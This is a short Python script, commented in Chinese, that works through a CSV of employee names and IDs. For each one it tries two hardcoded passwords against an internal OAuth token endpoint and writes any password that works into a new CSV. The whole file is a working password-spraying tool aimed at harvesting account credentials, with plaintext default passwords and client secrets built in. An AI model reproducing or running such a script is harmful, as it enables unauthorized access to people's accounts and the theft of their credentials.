# 获取用户的密码的方法，通过登录尝试账号和密码是不是对的来获取密码，并且将对的密码回填到csv文件中
import csv

import requests

session = requests.session()

session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0",
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/x-www-form-urlencoded",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
    "Cookie": "jenkins-timestamper-offset=-28800000; sidebarStatus=1"
})
url = "http://192.168.1.25/march/march-oauth/oauth/token"

with open("../res/emp_info.csv", "r", encoding="utf-8", newline="") as f2:
    reader = csv.reader(f2)
    next(reader)
    # 读取所有行
    rows = list(reader)

with open("../res/emp_info_test2.csv", "w", encoding="utf-8", newline="") as f:
    writer = csv.writer(f)
    writer.writerow(["姓名", "工号", "密码"])
    for row in rows:
        name = row[0]
        username = row[1]
        final_password = ""

        data1 = {
            "grant_type": "password",
            "scope": "all",
            "username": f'{{"username":"{username}"}}',
            "password": "mhMH12@@",
            "client_id": "march",
            "client_secret": "march"
        }
        print("正在验证" + name, username, "mhMH12@@")
        resp = session.post("http://192.168.1.25/march/march-oauth/oauth/token", data=data1)

        if resp.status_code == 200:
            final_password = "mhMH12@@"

        data2 = {
            "grant_type": "password",
            "scope": "all",
            "username": f'{{"username":"{username}"}}',
            "password": "HYZdevadmin1234",
            "client_id": "march",
            "client_secret": "march"
        }
        print("正在验证" + name, username, "HYZdevadmin1234")
        resp2 = session.post(url, data=data2)
        if resp2.status_code == 200:
            final_password = "HYZdevadmin1234"

        writer.writerow([name, username, final_password])

session.close()
